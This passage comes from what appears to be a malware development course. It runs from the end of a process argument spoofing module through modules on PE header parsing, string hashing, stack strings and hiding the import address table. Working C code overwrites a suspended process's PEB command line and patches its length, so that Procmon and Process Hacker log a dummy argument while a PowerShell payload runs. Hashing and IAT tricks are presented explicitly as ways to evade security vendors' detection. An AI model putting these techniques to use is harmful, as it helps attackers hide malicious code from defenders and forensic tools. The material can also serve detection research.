	// Reading the PEB structure from its base address in the remote process
	if (!ReadFromTargetProcess(Pi.hProcess, PBI.PebBaseAddress, &pPeb, sizeof(PEB))) {
		printf("\t[!] Failed To Read Target's Process Peb \n");
		return FALSE;
	}

	// Reading the RTL_USER_PROCESS_PARAMETERS structure from the PEB of the remote process
	// Read an extra 0xFF bytes to ensure we have reached the CommandLine.Buffer pointer
	// 0xFF is 255 but it can be whatever you like
	if (!ReadFromTargetProcess(Pi.hProcess, pPeb->ProcessParameters, &pParms, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF)) {
		printf("\t[!] Failed To Read Target's Process ProcessParameters \n");
		return FALSE;
	}

	// Writing the real argument to the process
	if (!WriteToTargetProcess(Pi.hProcess, (PVOID)pParms->CommandLine.Buffer, (PVOID)szRealArgs, (DWORD)(lstrlenW(szRealArgs) * sizeof(WCHAR) + 1))) {
		printf("\t[!] Failed To Write The Real Parameters\n");
		return FALSE;
	}


	// Cleaning up
	HeapFree(GetProcessHeap(), NULL, pPeb);
	HeapFree(GetProcessHeap(), NULL, pParms);

	// Resuming the process with the new paramters
	ResumeThread(Pi.hThread);

	// Saving output parameters
	*dwProcessId     = Pi.dwProcessId;
	*hProcess        = Pi.hProcess;
	*hThread         = Pi.hThread;

	// Checking if everything is valid
	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}

```

### Demo

`powershell.exe Totally Legit Argument`??is the dummy argument that will be logged whereas??`powershell.exe -c calc.exe`??is the payload that is executed.

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/arg-spoof-309567835-eed3b698-80d0-4a39-ae98-7d2f4120a9a3.png)
# 5.7 Process Argument Spoofing (2)

### Introduction

In the previous module, Procmon was tricked into logging the dummy command line arguments. However, the same technique does not work as well against some tools such as Process Hacker. The image below shows the result of argument spoofing in Process Hacker.

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/spoofing-109614220-d9136e16-4a7e-4ce2-a309-db47577d6f88.png)

The legitimate arguments are being exposed by Process Hacker along with a fragment of the dummy argument. This module will analyze why this occurs and provide a solution for it.

### Analyzing The Problem

To better understand why the legitimate arguments are exposed, the dummy argument will be set to??`powershell.exe AAAAAAA...`.

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/spoofing-209614417-27d1960a-a101-4d6d-8247-e49c9a387556.png)

Checking Process Hacker again reveals that the legit and dummy arguments are logged.

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/spoofing-309614553-c8f18edc-301f-4bca-92e6-bf65ae03bddf.png)

The use of??`PEB->ProcessParameters.CommandLine.Buffer`??to overwrite the payload can be exposed by Process Hacker and other tools such as??[Process Explorer](https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer)??because these tools use??`NtQueryInformationProcess`??to read the command line arguments of a process at runtime. Since this occurs at runtime, they can see what is currently inside??`PEB->ProcessParameters.CommandLine.Buffer`.

### Solution

These tools read the??`CommandLine.Buffer`??up until the length specified by??`CommandLine.Length`. They do not rely on??`CommandLine.Buffer`??being null-terminated because Microsoft states in??[their documentation](https://learn.microsoft.com/en-us/windows/win32/api/subauth/ns-subauth-unicode_string)??that??`UNICODE_STRING.Buffer`??might not be null-terminated.

In short, these tools limit the number of bytes read from??`CommandLine.Buffer`??to be equal to??`CommandLine.Length`??in order to prevent reading additional unnecessary bytes in the event that??`CommandLine.Buffer`??is not null-terminated.

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/spoofing-409618296-d64a33d8-0d25-400f-9a2d-47d9483ec70f.png)

It's possible to trick these tools by setting the??`CommandLine.Length`??to be less than what the buffer size is. This allows control over how much of the payload inside??`CommandLine.Buffer`??is exposed. This can be achieved by patching the??`CommandLine.Length`??address in the remote process, passing the desired size of the buffer to be read by the external tools.

### Patching CommandLine.Length

The following code snippet patches??`PEB->ProcessParameters.CommandLine.Length`??to limit what Process Hacker can read from??`CommandLine.Buffer`??only to??`powershell.exe`. It works by first spoofing the argument to??`Totally Legit Argument`??then patching the length to be the size of??`sizeof(L"powershell.exe")`.

```c
DWORD dwNewLen = sizeof(L"powershell.exe");

if (!WriteToTargetProcess(Pi.hProcess, ((PBYTE)pPeb->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length)), (PVOID)&dwNewLen, sizeof(DWORD))){
  return FALSE;
}
```

### Demo

Process Hacker view.

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/spoofing-509622098-ebfd8016-9d4d-413f-929f-53e8465666dd.png)

  

Procmon view.

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/spoofing-609622288-7f9400eb-100e-490a-a5a6-adbfa2b61f42.png)
# 5.8 Parsing PE Headers

### Introduction

Early on in a beginner module, the PE file format structure was briefly discussed. The module focused more on the theory rather than a programmatical perspective of accessing each header. This module will explain the process of extracting components of a PE file and provide more insight into the file structure, which will ultimately become a prerequisite for more advanced modules.

Review the introductory PE file structure module if the PE structure is not well understood.

### PE Structure

Recall the diagram below from the introductory module which shows a simplified structure of the PE format. Every header shown in the image is defined as a data structure that holds information about the PE file.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/pe-structure.png)

### Relative Virtual Addresses (RVAs)

Relative Virtual Addresses (RVAs) are addresses that are used to reference locations within a PE file. They are used to specify the location of various data structures and sections within the PE file, such as code, data, and resources.

An RVA is a 32-bit value that specifies the??**offset**??of a data structure or section from the beginning of the PE file. It is called a "relative" address because it specifies the offset from the beginning of the file, rather than an absolute address in memory. This allows the same file to be loaded at different addresses in memory without requiring any changes to the RVAs within the file.

RVAs are used extensively in the PE file format to specify the location of various data structures and sections within the file. For example, the PE header contains several RVAs that specify the location of the code and data sections, the import and export tables, and other important data structures.

To convert an RVA to a virtual address (VA), the operating system adds the base address of the module (the location in memory where the module is loaded) to the RVA. This allows the operating system to access the data at the specified location within the module, regardless of where the module is loaded in memory.

### DOS Header (IMAGE_DOS_HEADER)

The DOS header is located at the beginning of a PE file and contains information about the file, such as its size, and characteristics. Most importantly, it contains the RVA (offset) to the NT header.

The following snippet demonstrates how to retrieve the DOS header.

```c
// Pointer to the structure 
PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pPE;		
if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE){
	return -1;
}
```

Since the DOS header is located at the very beginning of a PE file, retrieving the DOS header is only a matter of typecasting the??`pPE`??variable to a??`PIMAGE_DOS_HEADER`. This provides a pointer to the DOS header structure. After that, a DOS signature check is performed to verify that the DOS header is valid.

### NT Header (IMAGE_NT_HEADERS)

The??`e_lfanew`??member of the DOS header is an RVA to the??`IMAGE_NT_HEADERS`??structure. To reach the NT header, simply add the base address of the PE file in memory to the offset (`e_lfanew`). This is done in the following code snippet.

```c
// Pointer to the structure
PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pPE + pImgDosHdr->e_lfanew);
if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
	return -1;
}
```

The if statement is an NT Signature check to confirm the validity of the??`IMAGE_NT_HEADERS`??structure.

### File Header (IMAGE_FILE_HEADER)

Since the file header is a member of the??`IMAGE_NT_HEADERS`??structure, it is can be accessed using the following line of code.

```c
IMAGE_FILE_HEADER		ImgFileHdr	= pImgNtHdrs->FileHeader;
```

#### File Header Members

The members of the??`IMAGE_FILE_HEADER`??structure are described below.

- `Machine`??- The type of machine for which the PE file or object file is intended.
    
- `NumberOfSections`??- The number of sections in the PE file or object file.
    
- `TimeDateStamp`??- Time and date when the PE file or object file was created.
    
- `PointerToSymbolTable`??- Offset in the file to the symbol table, if it exists.
    
- `NumberOfSymbols`??- Number of symbols in the symbol table.
    
- `SizeOfOptionalHeader`??- The size of the??_optional header_.
    
- `Characteristics`??- The characteristics of the PE file or object file. The values of this field are defined by the IMAGE_FILE_* constants; these specify the type of the PE file (.exe, .dll, .sys).
    

### Optional Header (IMAGE_OPTIONAL_HEADER)

Since the optional header is a member of the??`IMAGE_NT_HEADERS`??structure, it is can be accessed using the following code.

```c
IMAGE_OPTIONAL_HEADER	ImgOptHdr = pImgNtHdrs->OptionalHeader;
if (ImgOptHdr.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC) {
	return -1;
}
```

The if statement is used to verify the optional header.??`IMAGE_NT_OPTIONAL_HDR_MAGIC`'s value depends on whether the application is 32 or 64-bit.

- `IMAGE_NT_OPTIONAL_HDR32_MAGIC`??- 32-bit
    
- `IMAGE_NT_OPTIONAL_HDR64_MAGIC`??- 64-bit
    

Depending on the compiler architecture, the??`IMAGE_NT_OPTIONAL_HDR_MAGIC`??constant will automatically expand to the correct value.

#### Optional Header Important Members

The most important members of the??`IMAGE_OPTIONAL_HEADER`??structure are explained below.

- `Magic`??- Specifies the type of optional header that is present in the file.
    
- `MajorLinkerVersion`??and??`MinorLinkerVersion`??- Specify the version of the linker that was used to create the PE file.
    
- `SizeOfCode`,??`SizeOfInitializedData`, and??`SizeOfUninitializedData`??- Specifies the sizes of the code, initialized data, and uninitialized data sections in the PE file, respectively.
    
- `AddressOfEntryPoint`??- Specifies the address of the entry point function in the PE file, This is an??`RVA`??to the entry point.
    
- `BaseOfCode`??and??`BaseOfData`??- Specify the base addresses of the code and data sections in the PE file, respectively, These are??`RVAs`.
    
- `ImageBase`??- specifies the??_preferred_??base address at which the PE file should be loaded.
    
- `MajorOperatingSystemVersion`??and??`MinorOperatingSystemVersion`??- Specify the minimum version of the operating system required to run the PE file.
    
- `MajorImageVersion`??and??`MinorImageVersion`??- Specify the version of the PE file.
    
- `DataDirectory`??- One of the most important members in the optional header. This is an array of??[IMAGE_DATA_DIRECTORY](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_data_directory), which contains the directories in a PE file (discussed below).
    

### DataDirectory (IMAGE_DATA_DIRECTORY)

The Data Directory can be accessed from the optional's header last member. This is an array of??`IMAGE_DATA_DIRECTORY`??meaning each element in the array is an??`IMAGE_DATA_DIRECTORY`??structure that references a special data directory. The??`IMAGE_DATA_DIRECTORY`??structure is shown below.

```c
typedef struct _IMAGE_DATA_DIRECTORY {
    DWORD   VirtualAddress;
    DWORD   Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

```

The fields of the structure contain information such as:

- `VirtualAddress`??- Specifies the virtual address of the specified structure in the PE file, these are??`RVAs`.
    
- `Size`??- Specifies the size of the data directory.
    

#### Accessing Data Directories

Some of the predefined data directories in a PE file include:

- `IMAGE_DIRECTORY_ENTRY_EXPORT`??- Contains information about the functions and data that are exported from the PE file.
    
- `IMAGE_DIRECTORY_ENTRY_IMPORT`??- Contains information about the functions and data that are imported from other modules.
    
- `IMAGE_DIRECTORY_ENTRY_RESOURCE`??- Contains information about the resources (such as icons, strings, and bitmaps) that are included in the PE file.
    
- `IMAGE_DIRECTORY_ENTRY_EXCEPTION`??- Contains information about the exception handling tables in the PE file.
    

The data directories can be accessed using the following line of code.

```c
IMAGE_DATA_DIRECTORY DataDir = ImgOptHdr.DataDirectory[#INDEX IN THE ARRAY#];
```

For example, retrieving the data directory of the export directory is done as follows:

```c
IMAGE_DATA_DIRECTORY ExpDataDir = ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
```

### Export Table (IMAGE_EXPORT_DIRECTORY)

Unfortunately, this structure is not officially documented by Microsoft at the time of writing this module. Therefore, to understand the structure, unofficial documentation is used which can be found on the internet.

#### Export Table Structure

The export table is a structure defined as??`IMAGE_EXPORT_DIRECTORY`??which is shown below.

```c
typedef struct _IMAGE_EXPORT_DIRECTORY {
    DWORD   Characteristics;
    DWORD   TimeDateStamp;
    WORD    MajorVersion;
    WORD    MinorVersion;
    DWORD   Name;
    DWORD   Base;
    DWORD   NumberOfFunctions;
    DWORD   NumberOfNames;
    DWORD   AddressOfFunctions;     // RVA from base of image
    DWORD   AddressOfNames;         // RVA from base of image
    DWORD   AddressOfNameOrdinals;  // RVA from base of image
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;

```

#### Retrieving The Export Table

The??`IMAGE_EXPORT_DIRECTORY`??structure is used to store information about the functions and data that are exported from a PE file. This information is stored in the data directory array with the index??`IMAGE_DIRECTORY_ENTRY_EXPORT`. To fetch it from the??`IMAGE_OPTIONAL_HEADER`??structure:

```c
PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pPE + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
```

Where??`pPE`??is the base address of the loaded PE in memory and??`ImgOptHdr`??is the??`IMAGE_OPTIONAL_HEADER`??structure previously calculated.

#### Export Table Important Members

The most important members of the export table are the following:

- `NumberOfFunctions`??- Specifies the number of functions that are exported by the PE file.
    
- `NumberOfNames`??- Specifies the number of names that are exported by the PE file.
    
- `AddressOfFunctions`??- Specifies the address of an array of addresses of the exported functions.
    
- `AddressOfNames`??- Specifies the address of an array of addresses of the names of the exported functions.
    
- `AddressOfNameOrdinals`??- Specifies the address of an array of ordinal numbers for the exported functions.
    

### Import Address Table (IMAGE_IMPORT_DESCRIPTOR)

The import address table is an array of??`IMAGE_IMPORT_DESCRIPTOR`??structures with each one being for a DLL file that contains the functions that were used from these DLLs.

#### Import Address Table Structure

The??`IMAGE_IMPORT_DESCRIPTOR`??structure is also not officially documented by Microsoft although it is defined in the??[Winnt.h Header File](https://learn.microsoft.com/en-us/windows/win32/api/winnt/)??as follows:

```c
typedef struct _IMAGE_IMPORT_DESCRIPTOR {
    union {
        DWORD   Characteristics;
        DWORD   OriginalFirstThunk;
    } DUMMYUNIONNAME;
    DWORD   TimeDateStamp;
    DWORD   ForwarderChain;
    DWORD   Name;
    DWORD   FirstThunk;
} IMAGE_IMPORT_DESCRIPTOR;
```

#### Retrieving The Import Address Table

To fetch the import address table from the??`IMAGE_OPTIONAL_HEADER`??structure:

```c
IMAGE_IMPORT_DESCRIPTOR* pImgImpDesc = (PIMAGE_IMPORT_DESCRIPTOR)(pPE + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
```

Where??`pPE`??is the base address of the loaded PE in memory and??`ImgOptHdr`??is the??`IMAGE_OPTIONAL_HEADER`??structure previously calculated.

### Additional Undocumented Structures

Several undocumented structures can be accessed via the??`IMAGE_DATA_DIRECTORY`??array in the optional header but are not documented in the Winnt.h header file. These include the Import Address Table and Export Table discussed earlier, as well as additional structures. Below are a few more examples of undocumented structures.

- `IMAGE_TLS_DIRECTORY`??- This structure is used to store information about??[Thread-Local Storage](https://learn.microsoft.com/en-us/cpp/c-language/thread-local-storage?view=msvc-170)??(TLS) data in the PE file. It is important to be aware of how to retrieve this structure from the??`IMAGE_OPTIONAL_HEADER`??structure at this time; further details will be provided in subsequent modules when necessary.

```c
PIMAGE_TLS_DIRECTORY pImgTlsDir  = (PIMAGE_TLS_DIRECTORY)(pPE + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
```

- `IMAGE_RUNTIME_FUNCTION_ENTRY`??- This structure is used to store information about a runtime function in the PE file. A runtime function is a function that is called by the Windows operating system's exception handling mechanism to execute the exception handling code for an exception. It is important to be aware of how to retrieve this structure from the??`IMAGE_OPTIONAL_HEADER`??structure at this time; further details will be provided in subsequent modules when necessary.

```c
PIMAGE_RUNTIME_FUNCTION_ENTRY pImgRunFuncEntry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(pPE + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress);
```

- `IMAGE_BASE_RELOCATION`??- This structure is used to store information about the base relocations in the PE file. Base relocations are used to fix up the addresses of imported functions and variables in a PE file when it is loaded into memory at an address that differs from the address at which it was linked. It is important to be aware of how to retrieve this structure from the??`IMAGE_OPTIONAL_HEADER`??structure at this time; further details will be provided in subsequent modules when necessary.

```c
PIMAGE_BASE_RELOCATION pImgBaseReloc = (PIMAGE_BASE_RELOCATION)(pPE + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
```

### PE Sections

Be aware of the important PE sections such as??`.text`,??`.data`,??`.reloc`,??`.rsrc`. Additionally, there may be more PE sections depending on the compiler and its settings. Each of these sections has a??[IMAGE_SECTION_HEADER](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_section_header)??structure that contains information about it. The??`IMAGE_SECTION_HEADER`??structure is defined below.

```c
typedef struct _IMAGE_SECTION_HEADER {
  BYTE  Name[IMAGE_SIZEOF_SHORT_NAME];
  union {
    DWORD PhysicalAddress;
    DWORD VirtualSize;
  } Misc;
  DWORD VirtualAddress;
  DWORD SizeOfRawData;
  DWORD PointerToRawData;
  DWORD PointerToRelocations;
  DWORD PointerToLinenumbers;
  WORD  NumberOfRelocations;
  WORD  NumberOfLinenumbers;
  DWORD Characteristics;
} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;
```

#### IMAGE_SECTION_HEADER Important Members

Some of IMAGE_SECTION_HEADER's most important members;

- `Name`??- A null-terminated ASCII string that specifies the name of the section.
    
- `VirtualAddress`??- The virtual address of the section in memory, this is an??`RVA`.
    
- `SizeOfRawData`??- The size of the section in the PE file in bytes.
    
- `PointerToRelocations`??- The file offset of the relocations for the section.
    
- `NumberOfRelocations`??- The number of relocations for the section.
    
- `Characteristics`??- Contains flags that specify the characteristics of the section.
    

#### Retrieving The IMAGE_SECTION_HEADER Structure

The??`IMAGE_SECTION_HEADER`??structure is stored in an array within the PE file's headers. To access the first element, skip past the??`IMAGE_NT_HEADERS`??since the sections are located immediately after the NT headers. The following snippet shows how to retrieve the??`IMAGE_SECTION_HEADER`??structure, where??`pImgNtHdrs`??is a pointer to??`IMAGE_NT_HEADERS`??structure.

```c
PIMAGE_SECTION_HEADER pImgSectionHdr = (PIMAGE_SECTION_HEADER)(((PBYTE)pImgNtHdrs) + sizeof(IMAGE_NT_HEADERS));
```

#### Looping Through The Array

Looping through the array requires the array size which can be retrieved from the??`IMAGE_FILE_HEADER.NumberOfSections`??member. The subsequent elements in the array are located at an interval of??`sizeof(IMAGE_SECTION_HEADER)`??from the current element.

```c
PIMAGE_SECTION_HEADER pImgSectionHdr = (PIMAGE_SECTION_HEADER)(((PBYTE)pImgNtHdrs) + sizeof(IMAGE_NT_HEADERS));

for (size_t i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {
	// pImgSectionHdr is a pointer to section 1
	pImgSectionHdr = (PIMAGE_SECTION_HEADER)((PBYTE)pImgSectionHdr + (DWORD)sizeof(IMAGE_SECTION_HEADER));
	// pImgSectionHdr is a pointer to section 2
}
```

### Demo

This demo shows the PeParser project which is shared in this module. It can be used to parse PE files using the methods discussed throughout the module. Keep in mind, PeParser should be compiled as a 32-bit binary to parse a 32-bit program and 64-bit for a 64-bit program.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/pe-parser-109789281-55662de8-c252-427c-b4d0-8245e238ce10.png)

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/pe-parser-209789466-71cb09b6-7e8f-4694-b9b6-f5064aecfb9c.png)
# 5.9 String Hashing

### Introduction

Hashing is a technique that is used to create a fixed-size representation of a piece of data, called a hash value or hash code. Hashing algorithms are designed to be one-way functions, meaning that it is computationally infeasible to determine the original input data using the hash value. The hash code is generally shorter in size, and faster to work with. When comparing strings, hashing can be used to quickly determine if two strings are equal, as compared to comparing the strings themselves, especially if the strings are long.

In the context of malware development, string hashing is a useful approach for hiding strings used in an implementation, as strings can be used as signatures to help security vendors detect malicious binaries.

### String hashing

This module introduces some string hashing algorithms. It is essential to understand that the output of these algorithms is a number expressed in hexadecimal format, as it is neater and more compact. The following string hashing algorithms are discussed in this module.

- Dbj2
    
- JenkinsOneAtATime32Bit
    
- LoseLose
    
- Rotr32
    

There are many more string hashing algorithms available than those discussed in this module some of which can be found in??[VX-API GitHub repository](https://github.com/vxunderground/VX-API).

### Djb2

Djb2 is a simple and fast hashing algorithm, primarily used for generating hash values for strings, but also applicable to other types of data. It works by iterating over the characters in the input string and using each one to update a running hash value according to a specific algorithm which is demonstrated in the snippet below.

```c
hash = ((hash << 5) + hash) + c
```

`hash`??is the current hash value,??`c`??is the current character in the input string, and??`<<`??is the bitwise left shift operator.

The resulting hash value is a positive integer that is unique to the input string. Djb2 is known to produce good distributions of hash values, resulting in a low probability of collisions between different strings and their respective hash values.

The Djb2 implementation shown below is from the??[VX-API GitHub repository](https://github.com/vxunderground/VX-API/blob/main/VX-API/HashStringDjb2.cpp).

```c
#define INITIAL_HASH	3731  // added to randomize the hash
#define INITIAL_SEED	7     

// generate Djb2 hashes from Ascii input string
DWORD HashStringDjb2A(_In_ PCHAR String)
{
	ULONG Hash = INITIAL_HASH;
	INT c;

	while (c = *String++)
		Hash = ((Hash << INITIAL_SEED) + Hash) + c;

	return Hash;
}

// generate Djb2 hashes from wide-character input string
DWORD HashStringDjb2W(_In_ PWCHAR String)
{
	ULONG Hash = INITIAL_HASH;
	INT c;

	while (c = *String++)
		Hash = ((Hash << INITIAL_SEED) + Hash) + c;

	return Hash;
}
```

### JenkinsOneAtATime32Bit

The JenkinsOneAtATime32Bit algorithm works by iterating over the characters of the input string and incrementally updating a running hash value according to the value of each character. The algorithm for updating the hash value is demonstrated in the snippet below.

```c
hash += c;
hash += (hash << 10);
hash ^= (hash >> 6);
```

`hash`??is the current hash value and??`c`??is the current character in the input string.

The resulting hash value is a 32-bit integer that is unique to the input string. JenkinsOneAtATime32Bit is known to produce relatively good distributions of hash values, resulting in a low probability of collisions between different strings and their respective hash values.

The JenkinsOneAtATime32Bit implementation shown below is from the??[VX-API GitHub repository](https://github.com/vxunderground/VX-API/blob/main/VX-API/HashStringJenkinsOneAtATime32Bit.cpp).

```c
#define INITIAL_SEED	7	

// Generate JenkinsOneAtATime32Bit hashes from Ascii input string
UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String)
{
	SIZE_T Index = 0;
	UINT32 Hash = 0;
	SIZE_T Length = lstrlenA(String);

	while (Index != Length)
	{
		Hash += String[Index++];
		Hash += Hash << INITIAL_SEED;
		Hash ^= Hash >> 6;
	}

	Hash += Hash << 3;
	Hash ^= Hash >> 11;
	Hash += Hash << 15;

	return Hash;
}

// Generate JenkinsOneAtATime32Bit hashes from wide-character input string
UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String)
{
	SIZE_T Index = 0;
	UINT32 Hash = 0;
	SIZE_T Length = lstrlenW(String);

	while (Index != Length)
	{
		Hash += String[Index++];
		Hash += Hash << INITIAL_SEED;
		Hash ^= Hash >> 6;
	}

	Hash += Hash << 3;
	Hash ^= Hash >> 11;
	Hash += Hash << 15;

	return Hash;
}

```

### LoseLose

The LoseLose algorithm calculates the hash value of an input string by iterating over each character in the string and summing the ASCII values of each character. The algorithm for updating the hash value is demonstrated in the snippet below.

```c
hash = 0;
hash += c; // For each character c in the input string perform
```

The hash value resulting from the LoseLose algorithm is an integer that is unique to the input string. However, due to the lack of good distribution of hash values, collisions are likely to occur. To address this, the formula of the algorithm has been updated, as shown below.

```c
hash = 0;
hash += c; // For each character c in the input string
hash *= c + 2;  // For more randomization
```

This does not make it a good hashing algorithm but does somewhat improve it. The LoseLose implementation shown below is from the??[VX-API GitHub repository](https://github.com/vxunderground/VX-API/blob/main/VX-API/HashStringLoseLose.cpp).

```c
#define INITIAL_SEED	2

// Generate LoseLose hashes from ASCII input string
DWORD HashStringLoseLoseA(_In_ PCHAR String)
{
	ULONG Hash = 0;
	INT c;

	while (c = *String++) {
		Hash += c;
		Hash *= c + INITIAL_SEED;	// update
	}
	return Hash;
}

// Generate LoseLose hashes from wide-character input string
DWORD HashStringLoseLoseW(_In_ PWCHAR String)
{
	ULONG Hash = 0;
	INT c;

	while (c = *String++) {
		Hash += c;
		Hash *= c + INITIAL_SEED;	// update
	}

	return Hash;
}

```

### Rotr32

The Rotr32 string hashing algorithm uses iterated characters in the input string to sum their ASCII values, followed by the application of a bitwise rotation to the current hash value. The input value and a count (the count being??`INITIAL_SEED`) are used to carry out a right shift on the value, then OR'd with the original value left-shifted by the negation of the count.

The resulting hash value is a 32-bit integer that is unique to the input string. Rotr32 is known to produce relatively good distributions of hash values, resulting in a low probability of collisions between different strings and their respective hash values.

The Rotr32 implementation shown below is from the??[VX-API GitHub repository](https://github.com/vxunderground/VX-API/blob/main/VX-API/HashStringRotr32.cpp).

```c
#define INITIAL_SEED	5	

// Helper function that apply the bitwise rotation
UINT32 HashStringRotr32Sub(UINT32 Value, UINT Count)
{
	DWORD Mask = (CHAR_BIT * sizeof(Value) - 1);
	Count &= Mask;
#pragma warning( push )
#pragma warning( disable : 4146)
	return (Value >> Count) | (Value << ((-Count) & Mask));
#pragma warning( pop ) 
}

// Generate Rotr32 hashes from Ascii input string
INT HashStringRotr32A(_In_ PCHAR String)
{
	INT Value = 0;

	for (INT Index = 0; Index < lstrlenA(String); Index++)
		Value = String[Index] + HashStringRotr32Sub(Value, INITIAL_SEED);

	return Value;
}

// Generate Rotr32 hashes from wide-character input string
INT HashStringRotr32W(_In_ PWCHAR String)
{
	INT Value = 0;

	for (INT Index = 0; Index < lstrlenW(String); Index++)
		Value = String[Index] + HashStringRotr32Sub(Value, INITIAL_SEED);

	return Value;
}
```

### Stack Strings

In C/C++ programming languages, a string can be represented as an array of characters thus separating characters from each other which helps in evading string-based detections. For example, the string "hello world" can be represented as the array below.

```c
	char string[] = { 'h', 'e', 'l', 'l', 'o', ' ', 'w', 'o', 'r', 'l', 'd', '\0' };
```

Searching for the string "hello world" using the??`HxD`??binary editor will return nothing.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/string-hashing-020876979-d3fbb005-d0d5-4624-a302-9f0f0469d86a.png)

However, stack strings are not sufficient to hide the string from some debuggers and reverse engineering tools as they can contain plugins to detect them.

### Demo

The string "MaldevAcademy" is hashed below using the algorithms mentioned in this module. The string is hashed in both ASCII and Wide formats. Keep in mind that depending on the hashing algorithm the ASCII and Wide formats may not always generate the same hash value.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/string-hashing-109826350-7f0ae4f9-76c6-4293-990a-16ff72de7e0b.png)
# 6.0 IAT Hiding & Obfuscation - Introduction

### Introduction

The Import Address Table (IAT) contains information regarding a PE file, such as the functions used and the DLLs exporting them. This type of information can be used to signature and detect the binary.

For example, the image below shows the import address table of the binary from the??_Process Injection - Shellcode_??module. The PE file imports functions which are considered highly suspicious. Security solutions can then use this information to flag the implementation.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/iat-intro-209847024-7ba7fa01-913d-405a-94c1-6cd28adcee51.png)

Note that the majority of the remaining functions were added by the compiler and will be dealt with in future modules.

### IAT Hiding & Obfuscation - Method 1

To hide functions from the IAT, it's possible to use??`GetProcAddress`,??`GetModuleHandle`??or??`LoadLibrary`??to load these functions dynamically during runtime. The snippet below will load??`VirtualAllocEx`??dynamically and therefore it will not appear in the IAT when inspected.

```c
typedef LPVOID (WINAPI* fnVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

//...
fnVirtualAllocEx pVirtualAllocEx = GetProcAddress(GetModuleHandleA("KERNEL32.DLL"), "VirtualAllocEx");
pVirtualAllocEx(...);
```

Although this may appear to be an elegant solution, it's not a very good one for several reasons:

- First, the??`VirtualAllocEx`??string exists in the binary which can be used to detect the usage of the function.
    
- `GetProcAddress`??and??`GetModuleHandleA`??will appear in the IAT, which in itself is used as a signature.
    

### IAT Hiding & Obfuscation - Method 2

A more elegant solution is to create custom functions that perform the same actions as??`GetProcAddress`??and??`GetModuleHandle`??WinAPIs. This way, it becomes possible to dynamically load functions without having these two functions appear in the IAT. The next modules will discuss this solution more in depth.
# 6.1 IAT Hiding & Obfuscation - Custom GetProcAddress

### Introduction

The??`GetProcAddress`??WinAPI retrieves the address of an exported function from a specified module handle. The function returns??`NULL`??if the function name is not found in the specified module handle.

In this module, a function that replaces??`GetProcAddress`??will be implemented. The new function's prototype is shown below.

```c
FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpApiName) {}
```

### How GetProcAddress Works

The first point that must be addressed is how a function's address is found and retrieved by the??`GetProcAddress`??WinAPI.

The??`hModule`??parameter is the base address of the loaded DLL. This is the address where the DLL module is found in the address space of the process. With that in mind, retrieving a function's address is found by looping through the exported functions inside the provided DLL and checking if the target function's name exists. If there's a valid match, retrieve the address.

To access the exported functions, it's necessary to access the DLL's export table and loop through it in search of the target function name.

### Recall - Export Table Structure

Recall the??_Parsing PE Headers_??module, it was mentioned that the export table is a structure defined as??`IMAGE_EXPORT_DIRECTORY`.

```c
typedef struct _IMAGE_EXPORT_DIRECTORY {
    DWORD   Characteristics;
    DWORD   TimeDateStamp;
    WORD    MajorVersion;
    WORD    MinorVersion;
    DWORD   Name;
    DWORD   Base;
    DWORD   NumberOfFunctions;
    DWORD   NumberOfNames;
    DWORD   AddressOfFunctions;     // RVA from base of image
    DWORD   AddressOfNames;         // RVA from base of image
    DWORD   AddressOfNameOrdinals;  // RVA from base of image
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
```

The relevant members of this structure for this module are the last three.

- `AddressOfFunctions`??- Specifies the address of an array of addresses of the exported functions.
    
- `AddressOfNames`??- Specifies the address of an array of addresses of the names of the exported functions.
    
- `AddressOfNameOrdinals`??- Specifies the address of an array of??_ordinal numbers_??for the exported functions.
    

### Recall - Accessing the Export Table

